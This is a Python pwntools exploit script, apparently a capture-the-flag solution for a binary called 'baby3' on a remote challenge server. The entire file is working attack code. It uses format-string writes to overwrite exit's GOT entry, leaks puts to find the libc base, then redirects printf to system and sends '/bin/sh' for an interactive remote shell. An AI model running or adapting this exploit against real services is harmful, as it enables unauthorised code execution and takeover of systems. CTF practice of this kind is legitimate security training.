from pwn import *

e=ELF('baby3')

puts_got=e.got['puts']
exit_got=e.got['exit']
setvbuf_got = e.got['setvbuf']
printf_got = e.got['printf']
main=0x40076f

while 1:
    p=remote('baby-01.pwn.beer',10003)
    #p=process('baby3')

    payload = "%7c%10$hhn%57c%11$hhn%47c%12$hhn".ljust(32)
    payload += p64(exit_got+1) + p64(exit_got+2) + p64(exit_got)
    p.sendlineafter("input",payload)

    payload = "%7$s".ljust(8)+p64(puts_got)
    p.sendlineafter("input: ",payload)
    puts = u64(p.recvline()[:6]+'\x00'*2)
    lb = puts-0x809c0
    og = lb + 0x4f2c5
    system = lb+0x4f440

    bytes=[ (system>>(8*i))&0xff for i in range(3)]
    bytes.insert(0,0)

    payload = "%8c%16$hhn%10c%17$hhn%46c%18$hhn%19$hhn"
    for i in range(2,4):
        payload += "%{}c%{}$hhn".format(bytes[i]-bytes[i-1],18+i)

    if '-' in payload:
        p.close()
        continue

    payload = payload.ljust(80)
    payload += p64(exit_got+1) + p64(exit_got) + p64(exit_got+2)
    payload += p64(printf_got) + p64(printf_got+1) + p64(printf_got+2)[:-1]
    p.sendafter("input: ",payload)
    p.sendline("/bin/sh\x00")

    p.interactive()
    break
